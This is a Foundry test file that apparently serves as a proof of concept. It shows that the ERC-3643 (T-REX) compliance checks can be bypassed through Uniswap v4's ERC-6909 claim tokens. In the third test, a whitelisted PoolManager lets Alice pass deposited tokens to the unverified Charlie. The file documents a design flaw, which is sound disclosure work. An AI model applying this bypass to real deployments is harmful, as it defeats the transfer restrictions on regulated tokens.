// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {TREXSuite} from "./utils/TREXSuite.t.sol";
import {IIdentity} from "@onchain-id/solidity/contracts/interface/IIdentity.sol";
import {Deployers} from "v4-core/test/utils/Deployers.sol";
import {Currency} from "v4-core/src/types/Currency.sol";

contract ERC6909ProblemPoC is Test, TREXSuite, Deployers {
    function setUp() public {
        /**
         * TREX INFRA + TOKEN DEPLOYMENT + USERS IDENTITY DEPLOYMENTS
         */
        deployTREXFactory();
        deployTSTTokenSchenario();
        /**
         * UNISWAP V4 DEPLOYMENT
         */
        deployFreshManagerAndRouters();
    }

    function test_nonWhitelistedUserCannotReceiveERC3643Tokens() public {
        vm.startPrank(aliceAddr);
        vm.expectRevert();
        TSTContracts.token.transfer(charlieAddr, 1);
        vm.stopPrank();
    }

    function test_UniV4CannotReceiveERC3643Tokens() public {
        vm.startPrank(aliceAddr);
        vm.expectRevert(); // isVerified call fails since PoolManager is not whitelisted
        claimsRouter.deposit(Currency.wrap(address(TSTContracts.token)), aliceAddr, 1);
        vm.stopPrank();
    }

    function test_complianceCanBeBypassed() public {
        /**
         * To allow to the pool manager to have ERC-3643 tokens in his balance,
         * the first thought is to create an identitiy and whitelist it , nevertheless
         * this  can be problematic since ERC6909 can be used to bypass  compliance rules.
         */
        // Deploy PoolManager identity
        address PMIdAdmin = makeAddr("PMIdAdmin");
        vm.startPrank(PMIdAdmin);
        IIdentity PMId =
            IIdentity(deployArtifact("out/IdentityProxy.sol/IdentityProxy.json", abi.encode(identityIA, PMIdAdmin)));
        vm.stopPrank();

        // Register  PoolManager identity in the identity registry
        vm.startPrank(TSTTokenAgent);
        TSTContracts.identityRegistry.registerIdentity(address(manager), PMId, 42);
        vm.stopPrank();

        //  Sign claim for PoolManager identity
        ClaimData memory claim = ClaimData(PMId, TOPIC, "PoolManager public data!");
        bytes memory signatureClaim = signClaim(claim, TSTClaimIssuerKey);

        // Add claim to PoolManager identity
        vm.startPrank(PMIdAdmin);
        PMId.addClaim(claim.topic, 1, address(TSTClaimIssuerIdentity), signatureClaim, claim.data, "");
        vm.stopPrank();

        // Now Alice can deposit tokens and Mint ERC-6909 tokens
        Currency currency = Currency.wrap(address(TSTContracts.token));
        vm.startPrank(aliceAddr);
        TSTContracts.token.approve(address(claimsRouter), 100);
        claimsRouter.deposit(currency, aliceAddr, 100);
        vm.stopPrank();
        assertEq(manager.balanceOf(aliceAddr, currency.toId()), 100);

        // Now Alice  can send claim tokens charlie, this is wrong since charlie is not whitelisted
        vm.startPrank(aliceAddr);
        manager.transfer(charlieAddr, currency.toId(), 100);
        vm.stopPrank();
        console.log("This is wrong since charlie is not whitelisted:");
        console.log(
            "Charlie balance of TEST(as ERC-6909 claim tokens in PoolManager):",
            manager.balanceOf(charlieAddr, currency.toId())
        );
        console.log("Charlie isVerified:", TSTContracts.identityRegistry.isVerified(charlieAddr));
    }
}
